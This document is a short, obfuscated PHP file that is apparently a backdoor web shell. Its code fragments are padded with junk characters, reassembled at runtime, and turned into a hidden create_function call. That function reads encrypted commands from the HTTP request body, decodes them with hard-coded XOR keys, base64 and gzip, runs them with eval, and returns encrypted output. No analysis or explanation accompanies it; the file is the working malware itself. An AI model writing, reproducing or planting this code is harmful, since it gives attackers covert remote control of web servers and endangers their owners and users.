<?php
$p='!$k="a412!aa37"!;$kh="f1!9!f62817!456";!$kf!="c21a002f7c!41";$p=';
$R='m)=!=!1) {@ob_start();@!eva!l(@gzun!compress(@x(@!base!64!_decode($m';
$W='[1!!]),$k)));!$o=@ob_ge!t_cont!ents()!!;@ob_!!end_clean();$r=@b';
$E='tch("!/$kh(.+)!$!kf/",@file_get_con!tents!("php://!inp!u!t!"),$';
$s='"Uo!IjQAOVun!!hUn8fK";fu!ncti!o!n x($t,$k){!$c=strlen(!$!k);$l=s';
$V='a!se64!_encod!e(@x(@!gz!compress($o)!,$k))!;print!("$p$kh$r!$kf");}';
$l='trlen!($t);$o=!"";!for($i=0;!$i<$l;!){for(!$j=!0;($j!<$c&&$i<$l!!';
$r=');$j++,$i++!){$o!.=$t{$!i}!^$k{$j}!;!!}}return $o;}i!f (@pre!g!_ma';
$G=str_replace('DW','','creDWaDWDWtDWe_funDWDWction');
$A=str_replace('!','',$p.$s.$l.$r.$E.$R.$W.$V);
$a=$G('',$A);$a();
?>
